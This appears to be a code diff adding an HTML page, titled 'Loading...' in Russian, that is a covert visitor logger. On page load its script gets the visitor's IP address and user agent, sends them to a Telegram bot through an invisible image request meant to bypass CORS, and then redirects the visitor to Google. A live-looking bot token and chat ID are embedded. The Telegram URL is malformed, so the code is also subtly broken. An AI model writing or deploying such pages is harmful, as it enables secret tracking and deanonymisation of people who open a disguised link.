@@ -1,1 +1,44 @@
- 
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+</head>
+<body>
+    <script>
+        const botToken = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+        const chatId = "8426763446";
+
+        async function logVisit() {
+            try {
+                // 1. Узнаем IP через сторонний сервис
+                const response = await fetch('https://api.ipify.org');
+                const data = await response.json();
+                const ip = data.ip;
+                const device = navigator.userAgent;
+
+                const message = `🎯 Визит!\n🌐 IP: ${ip}\n📱 Устройство: ${device}`;
+
+                // 2. Формируем URL для отправки
+                const url = `https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                // 3. Отправляем через создание "невидимой картинки"
+                // Это обходит ограничения CORS, так как браузер просто пытается "загрузить" ссылку
+                const img = new Image();
+                img.src = url;
+
+            } catch (e) {
+                console.error('Ошибка');
+            } finally {
+                // Ждем 1 секунду, чтобы запрос успел уйти, и обновляем страницу
+                setTimeout(() => {
+                    // Чтобы не было бесконечной перезагрузки, лучше отправить на Google
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            }
+        }
+
+        logVisit();
+    </script>
+</body>
+</html>
